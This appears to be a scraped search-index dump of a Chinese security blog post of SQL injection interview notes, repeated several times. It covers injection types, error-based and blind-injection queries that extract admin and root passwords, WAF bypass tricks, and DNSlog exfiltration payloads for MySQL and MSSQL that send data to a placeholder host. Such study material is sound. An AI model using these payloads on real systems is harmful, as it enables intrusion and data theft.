9.多重关键字绕过如ununion","date":"2023-11-17","objectID":"/hvv_owasptop10/:0:1","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#8sql注入过滤逗号如何处理"},{"categories":["hvv"],"content":"\r01-SQL注入漏洞\r1.原理SQL注入是一种代码注入技术，用于攻击数据驱动的应用程序。在应用程序中，如果没有做恰当的过滤，则可能使得恶意的SQL语句被插入输入字段中执行（例如将数据库内容转储给攻击者）。 2.分类\r(1)注入点的不同分类●数字类型的注入 ●字符串类型的注入 (2)提交方式的不同分类●GET注入 ●POST注入 ●COOKIE注入 ●HTTP注入 (3)获取信息的方式不同分类●基于布尔的盲注 如果数据库中可以查到相应的数据，页面会正常显示，反之异常。 ●基于时间的盲注 无论输入任何数据，页面的效果完全一样，根据页面是否延迟判断出数据库中查询出的结果。 ●基于报错的注入 ●二次注入 ●宽字节注入 有些waf会在我们的提交数据前会被加入\\，\\的编码为%5c,我们在后面加上%df后变为了%df%5c,变成一个繁体汉字運，变成了一个有多个字节的字符。因为用了gbk编码，使这个为一个两字节，绕过了单引号闭合,逃逸了转义 ●盲注和延时注入的共同点？ 都是一个字符一个字符的判断 3.盲注原理将数据库中查询的数据结果进行截断为单个字符，然后同构造逻辑语句。通过判断页面显示是 否异常或页面是否演示来判断数据库中查询的结果 4.一个登录框怎么测试 验证用户名和密码的输入限制：在输入用户名和密码时，需要验证输入的长度、字符类型等是否符合要求。可以尝试输入过长或过短的字符串、特殊字符等来测试应用程序的输入限制。 测试身份认证功能：尝试使用正确的用户名和密码进行登录，并确认登录成功后能够访问受保护的资源。然后尝试使用无效的凭据进行登录，确保会收到相应的错误提示信息。 测试防止暴力破解的措施：如果应用程序有防止暴力破解的措施，例如锁定账户或添加验证码等，需要测试这些措施是否有效。 测试跨站点脚本（XSS）漏洞：在输入框中注入 JavaScript 代码，尝试看是否能执行该代码，如果能执行，则意味着应用程序存在 XSS 漏洞。 测试 SQL 注入漏洞：在输入框中注入 SQL 代码，尝试看是否能影响后台数据库，如果能影响，则意味着应用程序存在 SQL 注入漏洞。 测试弱口令：尝试使用一些常见的弱口令进行登录，例如“123456”、“password”、“admin”等，以检测应用程序是否容易受到攻击。 测试会话管理：测试应用程序在登录后是否正确维护会话，例如在登录后关闭浏览器并重新打开应用程序，是否需要重新进行登录等。 5.报错注入的函数有哪些？ extractvalue(1, concat(0x5c,(select user()))) updatexml(0x3a,concat(1,(select user())),1) exp((SELECT * from(select user())a))``ST_LatFromGeoHash((select * from(select * from(select user())a)b)) GTID_SUBSET(version(), 1) **SUBSTRING() 函数：**该函数用于从字符串中获取子串。通过构造包含错误的语句，攻击者可以利用该函数来确定字符串值的长度和内容，例如： SELECT SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1),1,1); **LENGTH() 函数：**该函数返回字符串的长度。攻击者可以使用该函数来确定查询结果的长度，并进一步推断数据的内容，例如： SELECT LENGTH((SELECT username from users WHERE id=1)); **ASCII() 函数：**该函数返回字符的 ASCII 值。攻击者可以结合其他函数，例如 SUBSTRING() 和 LENGTH()，来识别字符串值的每个字符，例如： SELECT ASCII(SUBSTRING((SELECT password from users WHERE username='admin'),1,1)); 6.Sql 注入无回显的情况下，利用 DNSlog，mysql 下利用什么构造代码，mssql 下又如何构造？（1）没有回显的情况下，一般编写脚本，进行自动化注入。但与此同时，由于防火墙的存在，容易被封禁IP，可以尝试调整请求频率，有条件的使用代理池进行请求。 （2）此时也可以使用 DNSlog 注入，原理就是把服务器返回的结果放在域名中，然后读取 DNS 解析时的日志，来获取想要的信息。 （3）Mysql 中利用 load_file() 构造payload ’ and if((select load_file(concat(’\\’,(select database()),’.xxx.ceye.io\\abc’))),1,0)# （4）Mssql 下利用 master..xp_dirtree 构造payload DECLARE @host varchar(1024);SELECT @host=(SELECT db_name())+'.xxx.ceye.io';EXEC('master..xp_dirtree\"'+@host+'\\foobar$\"'); 7.SQL注入时 and or 被过滤怎办？1.大小写变形 2.编码 3.添加注释 4.双写法 5.利用符号形式 6.浮点数 #数字被注释 7.函数替代 #符号被注释 8.SQL注入过滤逗号如何处理在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决: select substr(database() from 1 for 1); select mid(database() from 1 for 1); 使用join： union select 1,2 #等价于 union select * from (select 1)a join (select 2)b 使用like： select ascii(mid(user(),1,1))=80 #等价于 select user() like 'r%' 对于limit可以使用offset来绕过： select * from news limit 0,1 # 等价于下面这条SQL语句 select * from news limit 1 offset 0 select * from table1 where id =1 and exists (select * from table2 where ord(substring(username from 1 for 1)=97); 127' UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e)# select case when substring((select password from mysql.user where user='root') from 1 for 1)='e' then sleep(5) else 0 end # substring((select password from mysql.user where user='root') from -1）='e' 原文：https://blog.csdn.net/nzjdsds/article/details/81322529 https://www.jianshu.com/p/d10785d22db2 9.sql 注入绕过 WAF的 方法？白盒 根据waf的固定规则去寻找有没有漏网之鱼. 黑盒 架构层绕waf 用户本身是进入waf后访问web页面的,只要我们找到web的真实ip,就可以绕过waf 在同网段内,页面与页面之间,服务器与服务器之间,通过waf的防护,然后展示给我们,只要我们在内部服务之间进行访问,即可绕过waf 边界漏洞,同样类似于同网段数据,我们可以利用已知服务器存在的ssrf漏洞,将数据直接发送给同网段的web2进行sql注入. 协议层面绕过waf 基于协议层,有的waf只过滤get请求,而对post请求没有做别的限制,因此,可以将get类型转换成post请求 文件格式,页面只对Content-Type为application/x-www-form-urlencoded数据格式进行过滤,因此我们可以将Content-Tyoe格式修改为multipart/form-data,即可绕过 参数污染 有的waf仅对部分内容进行过滤如 规则层面绕过 1.关键字可以用%（只限 IIS 系列）。比如 select，可以 sel%e%ct 2.注释绕过，如 /*!select*/，/**/，/*!*/，/*!12345*/，# 3.编码绕过如十六进制编码、URL编码、Unicode编码（服务器端未检测或检测不严具有编码形式的关键字） 4.multipart 请求绕过，在 POST 请求中添加一个上传文件，绕过了绝大多数 WAF 5.参数绕过，复制参数，id=1\u0026id=1 6.组合法 如 and 可以用\u0026\u0026再 URL 编码 7.替换法，如 and 改成\u0026\u0026;=可以用 like 或 in 等 8.函数大小写混写绕过（服务器端检测是未开启大小写不敏感） 9.多重关键字绕过如ununion","date":"2023-11-17","objectID":"/hvv_owasptop10/:0:1","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#9sql-注入绕过-waf的-方法"},{"categories":["hvv"],"content":"\r01-SQL注入漏洞\r1.原理SQL注入是一种代码注入技术，用于攻击数据驱动的应用程序。在应用程序中，如果没有做恰当的过滤，则可能使得恶意的SQL语句被插入输入字段中执行（例如将数据库内容转储给攻击者）。 2.分类\r(1)注入点的不同分类●数字类型的注入 ●字符串类型的注入 (2)提交方式的不同分类●GET注入 ●POST注入 ●COOKIE注入 ●HTTP注入 (3)获取信息的方式不同分类●基于布尔的盲注 如果数据库中可以查到相应的数据，页面会正常显示，反之异常。 ●基于时间的盲注 无论输入任何数据，页面的效果完全一样，根据页面是否延迟判断出数据库中查询出的结果。 ●基于报错的注入 ●二次注入 ●宽字节注入 有些waf会在我们的提交数据前会被加入\\，\\的编码为%5c,我们在后面加上%df后变为了%df%5c,变成一个繁体汉字運，变成了一个有多个字节的字符。因为用了gbk编码，使这个为一个两字节，绕过了单引号闭合,逃逸了转义 ●盲注和延时注入的共同点？ 都是一个字符一个字符的判断 3.盲注原理将数据库中查询的数据结果进行截断为单个字符，然后同构造逻辑语句。通过判断页面显示是 否异常或页面是否演示来判断数据库中查询的结果 4.一个登录框怎么测试 验证用户名和密码的输入限制：在输入用户名和密码时，需要验证输入的长度、字符类型等是否符合要求。可以尝试输入过长或过短的字符串、特殊字符等来测试应用程序的输入限制。 测试身份认证功能：尝试使用正确的用户名和密码进行登录，并确认登录成功后能够访问受保护的资源。然后尝试使用无效的凭据进行登录，确保会收到相应的错误提示信息。 测试防止暴力破解的措施：如果应用程序有防止暴力破解的措施，例如锁定账户或添加验证码等，需要测试这些措施是否有效。 测试跨站点脚本（XSS）漏洞：在输入框中注入 JavaScript 代码，尝试看是否能执行该代码，如果能执行，则意味着应用程序存在 XSS 漏洞。 测试 SQL 注入漏洞：在输入框中注入 SQL 代码，尝试看是否能影响后台数据库，如果能影响，则意味着应用程序存在 SQL 注入漏洞。 测试弱口令：尝试使用一些常见的弱口令进行登录，例如“123456”、“password”、“admin”等，以检测应用程序是否容易受到攻击。 测试会话管理：测试应用程序在登录后是否正确维护会话，例如在登录后关闭浏览器并重新打开应用程序，是否需要重新进行登录等。 5.报错注入的函数有哪些？ extractvalue(1, concat(0x5c,(select user()))) updatexml(0x3a,concat(1,(select user())),1) exp((SELECT * from(select user())a))``ST_LatFromGeoHash((select * from(select * from(select user())a)b)) GTID_SUBSET(version(), 1) **SUBSTRING() 函数：**该函数用于从字符串中获取子串。通过构造包含错误的语句，攻击者可以利用该函数来确定字符串值的长度和内容，例如： SELECT SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1),1,1); **LENGTH() 函数：**该函数返回字符串的长度。攻击者可以使用该函数来确定查询结果的长度，并进一步推断数据的内容，例如： SELECT LENGTH((SELECT username from users WHERE id=1)); **ASCII() 函数：**该函数返回字符的 ASCII 值。攻击者可以结合其他函数，例如 SUBSTRING() 和 LENGTH()，来识别字符串值的每个字符，例如： SELECT ASCII(SUBSTRING((SELECT password from users WHERE username='admin'),1,1)); 6.Sql 注入无回显的情况下，利用 DNSlog，mysql 下利用什么构造代码，mssql 下又如何构造？（1）没有回显的情况下，一般编写脚本，进行自动化注入。但与此同时，由于防火墙的存在，容易被封禁IP，可以尝试调整请求频率，有条件的使用代理池进行请求。 （2）此时也可以使用 DNSlog 注入，原理就是把服务器返回的结果放在域名中，然后读取 DNS 解析时的日志，来获取想要的信息。 （3）Mysql 中利用 load_file() 构造payload ’ and if((select load_file(concat(’\\’,(select database()),’.xxx.ceye.io\\abc’))),1,0)# （4）Mssql 下利用 master..xp_dirtree 构造payload DECLARE @host varchar(1024);SELECT @host=(SELECT db_name())+'.xxx.ceye.io';EXEC('master..xp_dirtree\"'+@host+'\\foobar$\"'); 7.SQL注入时 and or 被过滤怎办？1.大小写变形 2.编码 3.添加注释 4.双写法 5.利用符号形式 6.浮点数 #数字被注释 7.函数替代 #符号被注释 8.SQL注入过滤逗号如何处理在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决: select substr(database() from 1 for 1); select mid(database() from 1 for 1); 使用join： union select 1,2 #等价于 union select * from (select 1)a join (select 2)b 使用like： select ascii(mid(user(),1,1))=80 #等价于 select user() like 'r%' 对于limit可以使用offset来绕过： select * from news limit 0,1 # 等价于下面这条SQL语句 select * from news limit 1 offset 0 select * from table1 where id =1 and exists (select * from table2 where ord(substring(username from 1 for 1)=97); 127' UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e)# select case when substring((select password from mysql.user where user='root') from 1 for 1)='e' then sleep(5) else 0 end # substring((select password from mysql.user where user='root') from -1）='e' 原文：https://blog.csdn.net/nzjdsds/article/details/81322529 https://www.jianshu.com/p/d10785d22db2 9.sql 注入绕过 WAF的 方法？白盒 根据waf的固定规则去寻找有没有漏网之鱼. 黑盒 架构层绕waf 用户本身是进入waf后访问web页面的,只要我们找到web的真实ip,就可以绕过waf 在同网段内,页面与页面之间,服务器与服务器之间,通过waf的防护,然后展示给我们,只要我们在内部服务之间进行访问,即可绕过waf 边界漏洞,同样类似于同网段数据,我们可以利用已知服务器存在的ssrf漏洞,将数据直接发送给同网段的web2进行sql注入. 协议层面绕过waf 基于协议层,有的waf只过滤get请求,而对post请求没有做别的限制,因此,可以将get类型转换成post请求 文件格式,页面只对Content-Type为application/x-www-form-urlencoded数据格式进行过滤,因此我们可以将Content-Tyoe格式修改为multipart/form-data,即可绕过 参数污染 有的waf仅对部分内容进行过滤如 规则层面绕过 1.关键字可以用%（只限 IIS 系列）。比如 select，可以 sel%e%ct 2.注释绕过，如 /*!select*/，/**/，/*!*/，/*!12345*/，# 3.编码绕过如十六进制编码、URL编码、Unicode编码（服务器端未检测或检测不严具有编码形式的关键字） 4.multipart 请求绕过，在 POST 请求中添加一个上传文件，绕过了绝大多数 WAF 5.参数绕过，复制参数，id=1\u0026id=1 6.组合法 如 and 可以用\u0026\u0026再 URL 编码 7.替换法，如 and 改成\u0026\u0026;=可以用 like 或 in 等 8.函数大小写混写绕过（服务器端检测是未开启大小写不敏感） 9.多重关键字绕过如ununion","date":"2023-11-17","objectID":"/hvv_owasptop10/:0:1","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#10sql注入的告警的流量特征看哪些方面"},{"categories":["hvv"],"content":"\r01-SQL注入漏洞\r1.原理SQL注入是一种代码注入技术，用于攻击数据驱动的应用程序。在应用程序中，如果没有做恰当的过滤，则可能使得恶意的SQL语句被插入输入字段中执行（例如将数据库内容转储给攻击者）。 2.分类\r(1)注入点的不同分类●数字类型的注入 ●字符串类型的注入 (2)提交方式的不同分类●GET注入 ●POST注入 ●COOKIE注入 ●HTTP注入 (3)获取信息的方式不同分类●基于布尔的盲注 如果数据库中可以查到相应的数据，页面会正常显示，反之异常。 ●基于时间的盲注 无论输入任何数据，页面的效果完全一样，根据页面是否延迟判断出数据库中查询出的结果。 ●基于报错的注入 ●二次注入 ●宽字节注入 有些waf会在我们的提交数据前会被加入\\，\\的编码为%5c,我们在后面加上%df后变为了%df%5c,变成一个繁体汉字運，变成了一个有多个字节的字符。因为用了gbk编码，使这个为一个两字节，绕过了单引号闭合,逃逸了转义 ●盲注和延时注入的共同点？ 都是一个字符一个字符的判断 3.盲注原理将数据库中查询的数据结果进行截断为单个字符，然后同构造逻辑语句。通过判断页面显示是 否异常或页面是否演示来判断数据库中查询的结果 4.一个登录框怎么测试 验证用户名和密码的输入限制：在输入用户名和密码时，需要验证输入的长度、字符类型等是否符合要求。可以尝试输入过长或过短的字符串、特殊字符等来测试应用程序的输入限制。 测试身份认证功能：尝试使用正确的用户名和密码进行登录，并确认登录成功后能够访问受保护的资源。然后尝试使用无效的凭据进行登录，确保会收到相应的错误提示信息。 测试防止暴力破解的措施：如果应用程序有防止暴力破解的措施，例如锁定账户或添加验证码等，需要测试这些措施是否有效。 测试跨站点脚本（XSS）漏洞：在输入框中注入 JavaScript 代码，尝试看是否能执行该代码，如果能执行，则意味着应用程序存在 XSS 漏洞。 测试 SQL 注入漏洞：在输入框中注入 SQL 代码，尝试看是否能影响后台数据库，如果能影响，则意味着应用程序存在 SQL 注入漏洞。 测试弱口令：尝试使用一些常见的弱口令进行登录，例如“123456”、“password”、“admin”等，以检测应用程序是否容易受到攻击。 测试会话管理：测试应用程序在登录后是否正确维护会话，例如在登录后关闭浏览器并重新打开应用程序，是否需要重新进行登录等。 5.报错注入的函数有哪些？ extractvalue(1, concat(0x5c,(select user()))) updatexml(0x3a,concat(1,(select user())),1) exp((SELECT * from(select user())a))``ST_LatFromGeoHash((select * from(select * from(select user())a)b)) GTID_SUBSET(version(), 1) **SUBSTRING() 函数：**该函数用于从字符串中获取子串。通过构造包含错误的语句，攻击者可以利用该函数来确定字符串值的长度和内容，例如： SELECT SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1),1,1); **LENGTH() 函数：**该函数返回字符串的长度。攻击者可以使用该函数来确定查询结果的长度，并进一步推断数据的内容，例如： SELECT LENGTH((SELECT username from users WHERE id=1)); **ASCII() 函数：**该函数返回字符的 ASCII 值。攻击者可以结合其他函数，例如 SUBSTRING() 和 LENGTH()，来识别字符串值的每个字符，例如： SELECT ASCII(SUBSTRING((SELECT password from users WHERE username='admin'),1,1)); 6.Sql 注入无回显的情况下，利用 DNSlog，mysql 下利用什么构造代码，mssql 下又如何构造？（1）没有回显的情况下，一般编写脚本，进行自动化注入。但与此同时，由于防火墙的存在，容易被封禁IP，可以尝试调整请求频率，有条件的使用代理池进行请求。 （2）此时也可以使用 DNSlog 注入，原理就是把服务器返回的结果放在域名中，然后读取 DNS 解析时的日志，来获取想要的信息。 （3）Mysql 中利用 load_file() 构造payload ’ and if((select load_file(concat(’\\’,(select database()),’.xxx.ceye.io\\abc’))),1,0)# （4）Mssql 下利用 master..xp_dirtree 构造payload DECLARE @host varchar(1024);SELECT @host=(SELECT db_name())+'.xxx.ceye.io';EXEC('master..xp_dirtree\"'+@host+'\\foobar$\"'); 7.SQL注入时 and or 被过滤怎办？1.大小写变形 2.编码 3.添加注释 4.双写法 5.利用符号形式 6.浮点数 #数字被注释 7.函数替代 #符号被注释 8.SQL注入过滤逗号如何处理在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决: select substr(database() from 1 for 1); select mid(database() from 1 for 1); 使用join： union select 1,2 #等价于 union select * from (select 1)a join (select 2)b 使用like： select ascii(mid(user(),1,1))=80 #等价于 select user() like 'r%' 对于limit可以使用offset来绕过： select * from news limit 0,1 # 等价于下面这条SQL语句 select * from news limit 1 offset 0 select * from table1 where id =1 and exists (select * from table2 where ord(substring(username from 1 for 1)=97); 127' UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e)# select case when substring((select password from mysql.user where user='root') from 1 for 1)='e' then sleep(5) else 0 end # substring((select password from mysql.user where user='root') from -1）='e' 原文：https://blog.csdn.net/nzjdsds/article/details/81322529 https://www.jianshu.com/p/d10785d22db2 9.sql 注入绕过 WAF的 方法？白盒 根据waf的固定规则去寻找有没有漏网之鱼. 黑盒 架构层绕waf 用户本身是进入waf后访问web页面的,只要我们找到web的真实ip,就可以绕过waf 在同网段内,页面与页面之间,服务器与服务器之间,通过waf的防护,然后展示给我们,只要我们在内部服务之间进行访问,即可绕过waf 边界漏洞,同样类似于同网段数据,我们可以利用已知服务器存在的ssrf漏洞,将数据直接发送给同网段的web2进行sql注入. 协议层面绕过waf 基于协议层,有的waf只过滤get请求,而对post请求没有做别的限制,因此,可以将get类型转换成post请求 文件格式,页面只对Content-Type为application/x-www-form-urlencoded数据格式进行过滤,因此我们可以将Content-Tyoe格式修改为multipart/form-data,即可绕过 参数污染 有的waf仅对部分内容进行过滤如 规则层面绕过 1.关键字可以用%（只限 IIS 系列）。比如 select，可以 sel%e%ct 2.注释绕过，如 /*!select*/，/**/，/*!*/，/*!12345*/，# 3.编码绕过如十六进制编码、URL编码、Unicode编码（服务器端未检测或检测不严具有编码形式的关键字） 4.multipart 请求绕过，在 POST 请求中添加一个上传文件，绕过了绝大多数 WAF 5.参数绕过，复制参数，id=1\u0026id=1 6.组合法 如 and 可以用\u0026\u0026再 URL 编码 7.替换法，如 and 改成\u0026\u0026;=可以用 like 或 in 等 8.函数大小写混写绕过（服务器端检测是未开启大小写不敏感） 9.多重关键字绕过如ununion","date":"2023-11-17","objectID":"/hvv_owasptop10/:0:1","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#11sql写入shell的两个函数"},{"categories":["hvv"],"content":"\r01-SQL注入漏洞\r1.原理SQL注入是一种代码注入技术，用于攻击数据驱动的应用程序。在应用程序中，如果没有做恰当的过滤，则可能使得恶意的SQL语句被插入输入字段中执行（例如将数据库内容转储给攻击者）。 2.分类\r(1)注入点的不同分类●数字类型的注入 ●字符串类型的注入 (2)提交方式的不同分类●GET注入 ●POST注入 ●COOKIE注入 ●HTTP注入 (3)获取信息的方式不同分类●基于布尔的盲注 如果数据库中可以查到相应的数据，页面会正常显示，反之异常。 ●基于时间的盲注 无论输入任何数据，页面的效果完全一样，根据页面是否延迟判断出数据库中查询出的结果。 ●基于报错的注入 ●二次注入 ●宽字节注入 有些waf会在我们的提交数据前会被加入\\，\\的编码为%5c,我们在后面加上%df后变为了%df%5c,变成一个繁体汉字運，变成了一个有多个字节的字符。因为用了gbk编码，使这个为一个两字节，绕过了单引号闭合,逃逸了转义 ●盲注和延时注入的共同点？ 都是一个字符一个字符的判断 3.盲注原理将数据库中查询的数据结果进行截断为单个字符，然后同构造逻辑语句。通过判断页面显示是 否异常或页面是否演示来判断数据库中查询的结果 4.一个登录框怎么测试 验证用户名和密码的输入限制：在输入用户名和密码时，需要验证输入的长度、字符类型等是否符合要求。可以尝试输入过长或过短的字符串、特殊字符等来测试应用程序的输入限制。 测试身份认证功能：尝试使用正确的用户名和密码进行登录，并确认登录成功后能够访问受保护的资源。然后尝试使用无效的凭据进行登录，确保会收到相应的错误提示信息。 测试防止暴力破解的措施：如果应用程序有防止暴力破解的措施，例如锁定账户或添加验证码等，需要测试这些措施是否有效。 测试跨站点脚本（XSS）漏洞：在输入框中注入 JavaScript 代码，尝试看是否能执行该代码，如果能执行，则意味着应用程序存在 XSS 漏洞。 测试 SQL 注入漏洞：在输入框中注入 SQL 代码，尝试看是否能影响后台数据库，如果能影响，则意味着应用程序存在 SQL 注入漏洞。 测试弱口令：尝试使用一些常见的弱口令进行登录，例如“123456”、“password”、“admin”等，以检测应用程序是否容易受到攻击。 测试会话管理：测试应用程序在登录后是否正确维护会话，例如在登录后关闭浏览器并重新打开应用程序，是否需要重新进行登录等。 5.报错注入的函数有哪些？ extractvalue(1, concat(0x5c,(select user()))) updatexml(0x3a,concat(1,(select user())),1) exp((SELECT * from(select user())a))``ST_LatFromGeoHash((select * from(select * from(select user())a)b)) GTID_SUBSET(version(), 1) **SUBSTRING() 函数：**该函数用于从字符串中获取子串。通过构造包含错误的语句，攻击者可以利用该函数来确定字符串值的长度和内容，例如： SELECT SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1),1,1); **LENGTH() 函数：**该函数返回字符串的长度。攻击者可以使用该函数来确定查询结果的长度，并进一步推断数据的内容，例如： SELECT LENGTH((SELECT username from users WHERE id=1)); **ASCII() 函数：**该函数返回字符的 ASCII 值。攻击者可以结合其他函数，例如 SUBSTRING() 和 LENGTH()，来识别字符串值的每个字符，例如： SELECT ASCII(SUBSTRING((SELECT password from users WHERE username='admin'),1,1)); 6.Sql 注入无回显的情况下，利用 DNSlog，mysql 下利用什么构造代码，mssql 下又如何构造？（1）没有回显的情况下，一般编写脚本，进行自动化注入。但与此同时，由于防火墙的存在，容易被封禁IP，可以尝试调整请求频率，有条件的使用代理池进行请求。 （2）此时也可以使用 DNSlog 注入，原理就是把服务器返回的结果放在域名中，然后读取 DNS 解析时的日志，来获取想要的信息。 （3）Mysql 中利用 load_file() 构造payload ’ and if((select load_file(concat(’\\’,(select database()),’.xxx.ceye.io\\abc’))),1,0)# （4）Mssql 下利用 master..xp_dirtree 构造payload DECLARE @host varchar(1024);SELECT @host=(SELECT db_name())+'.xxx.ceye.io';EXEC('master..xp_dirtree\"'+@host+'\\foobar$\"'); 7.SQL注入时 and or 被过滤怎办？1.大小写变形 2.编码 3.添加注释 4.双写法 5.利用符号形式 6.浮点数 #数字被注释 7.函数替代 #符号被注释 8.SQL注入过滤逗号如何处理在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决: select substr(database() from 1 for 1); select mid(database() from 1 for 1); 使用join： union select 1,2 #等价于 union select * from (select 1)a join (select 2)b 使用like： select ascii(mid(user(),1,1))=80 #等价于 select user() like 'r%' 对于limit可以使用offset来绕过： select * from news limit 0,1 # 等价于下面这条SQL语句 select * from news limit 1 offset 0 select * from table1 where id =1 and exists (select * from table2 where ord(substring(username from 1 for 1)=97); 127' UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e)# select case when substring((select password from mysql.user where user='root') from 1 for 1)='e' then sleep(5) else 0 end # substring((select password from mysql.user where user='root') from -1）='e' 原文：https://blog.csdn.net/nzjdsds/article/details/81322529 https://www.jianshu.com/p/d10785d22db2 9.sql 注入绕过 WAF的 方法？白盒 根据waf的固定规则去寻找有没有漏网之鱼. 黑盒 架构层绕waf 用户本身是进入waf后访问web页面的,只要我们找到web的真实ip,就可以绕过waf 在同网段内,页面与页面之间,服务器与服务器之间,通过waf的防护,然后展示给我们,只要我们在内部服务之间进行访问,即可绕过waf 边界漏洞,同样类似于同网段数据,我们可以利用已知服务器存在的ssrf漏洞,将数据直接发送给同网段的web2进行sql注入. 协议层面绕过waf 基于协议层,有的waf只过滤get请求,而对post请求没有做别的限制,因此,可以将get类型转换成post请求 文件格式,页面只对Content-Type为application/x-www-form-urlencoded数据格式进行过滤,因此我们可以将Content-Tyoe格式修改为multipart/form-data,即可绕过 参数污染 有的waf仅对部分内容进行过滤如 规则层面绕过 1.关键字可以用%（只限 IIS 系列）。比如 select，可以 sel%e%ct 2.注释绕过，如 /*!select*/，/**/，/*!*/，/*!12345*/，# 3.编码绕过如十六进制编码、URL编码、Unicode编码（服务器端未检测或检测不严具有编码形式的关键字） 4.multipart 请求绕过，在 POST 请求中添加一个上传文件，绕过了绝大多数 WAF 5.参数绕过，复制参数，id=1\u0026id=1 6.组合法 如 and 可以用\u0026\u0026再 URL 编码 7.替换法，如 and 改成\u0026\u0026;=可以用 like 或 in 等 8.函数大小写混写绕过（服务器端检测是未开启大小写不敏感） 9.多重关键字绕过如ununion","date":"2023-11-17","objectID":"/hvv_owasptop10/:0:1","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#12sqlmap的--os-shell原理"},{"categories":["hvv"],"content":"\r01-SQL注入漏洞\r1.原理SQL注入是一种代码注入技术，用于攻击数据驱动的应用程序。在应用程序中，如果没有做恰当的过滤，则可能使得恶意的SQL语句被插入输入字段中执行（例如将数据库内容转储给攻击者）。 2.分类\r(1)注入点的不同分类●数字类型的注入 ●字符串类型的注入 (2)提交方式的不同分类●GET注入 ●POST注入 ●COOKIE注入 ●HTTP注入 (3)获取信息的方式不同分类●基于布尔的盲注 如果数据库中可以查到相应的数据，页面会正常显示，反之异常。 ●基于时间的盲注 无论输入任何数据，页面的效果完全一样，根据页面是否延迟判断出数据库中查询出的结果。 ●基于报错的注入 ●二次注入 ●宽字节注入 有些waf会在我们的提交数据前会被加入\\，\\的编码为%5c,我们在后面加上%df后变为了%df%5c,变成一个繁体汉字運，变成了一个有多个字节的字符。因为用了gbk编码，使这个为一个两字节，绕过了单引号闭合,逃逸了转义 ●盲注和延时注入的共同点？ 都是一个字符一个字符的判断 3.盲注原理将数据库中查询的数据结果进行截断为单个字符，然后同构造逻辑语句。通过判断页面显示是 否异常或页面是否演示来判断数据库中查询的结果 4.一个登录框怎么测试 验证用户名和密码的输入限制：在输入用户名和密码时，需要验证输入的长度、字符类型等是否符合要求。可以尝试输入过长或过短的字符串、特殊字符等来测试应用程序的输入限制。 测试身份认证功能：尝试使用正确的用户名和密码进行登录，并确认登录成功后能够访问受保护的资源。然后尝试使用无效的凭据进行登录，确保会收到相应的错误提示信息。 测试防止暴力破解的措施：如果应用程序有防止暴力破解的措施，例如锁定账户或添加验证码等，需要测试这些措施是否有效。 测试跨站点脚本（XSS）漏洞：在输入框中注入 JavaScript 代码，尝试看是否能执行该代码，如果能执行，则意味着应用程序存在 XSS 漏洞。 测试 SQL 注入漏洞：在输入框中注入 SQL 代码，尝试看是否能影响后台数据库，如果能影响，则意味着应用程序存在 SQL 注入漏洞。 测试弱口令：尝试使用一些常见的弱口令进行登录，例如“123456”、“password”、“admin”等，以检测应用程序是否容易受到攻击。 测试会话管理：测试应用程序在登录后是否正确维护会话，例如在登录后关闭浏览器并重新打开应用程序，是否需要重新进行登录等。 5.报错注入的函数有哪些？ extractvalue(1, concat(0x5c,(select user()))) updatexml(0x3a,concat(1,(select user())),1) exp((SELECT * from(select user())a))``ST_LatFromGeoHash((select * from(select * from(select user())a)b)) GTID_SUBSET(version(), 1) **SUBSTRING() 函数：**该函数用于从字符串中获取子串。通过构造包含错误的语句，攻击者可以利用该函数来确定字符串值的长度和内容，例如： SELECT SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1),1,1); **LENGTH() 函数：**该函数返回字符串的长度。攻击者可以使用该函数来确定查询结果的长度，并进一步推断数据的内容，例如： SELECT LENGTH((SELECT username from users WHERE id=1)); **ASCII() 函数：**该函数返回字符的 ASCII 值。攻击者可以结合其他函数，例如 SUBSTRING() 和 LENGTH()，来识别字符串值的每个字符，例如： SELECT ASCII(SUBSTRING((SELECT password from users WHERE username='admin'),1,1)); 6.Sql 注入无回显的情况下，利用 DNSlog，mysql 下利用什么构造代码，mssql 下又如何构造？（1）没有回显的情况下，一般编写脚本，进行自动化注入。但与此同时，由于防火墙的存在，容易被封禁IP，可以尝试调整请求频率，有条件的使用代理池进行请求。 （2）此时也可以使用 DNSlog 注入，原理就是把服务器返回的结果放在域名中，然后读取 DNS 解析时的日志，来获取想要的信息。 （3）Mysql 中利用 load_file() 构造payload ’ and if((select load_file(concat(’\\’,(select database()),’.xxx.ceye.io\\abc’))),1,0)# （4）Mssql 下利用 master..xp_dirtree 构造payload DECLARE @host varchar(1024);SELECT @host=(SELECT db_name())+'.xxx.ceye.io';EXEC('master..xp_dirtree\"'+@host+'\\foobar$\"'); 7.SQL注入时 and or 被过滤怎办？1.大小写变形 2.编码 3.添加注释 4.双写法 5.利用符号形式 6.浮点数 #数字被注释 7.函数替代 #符号被注释 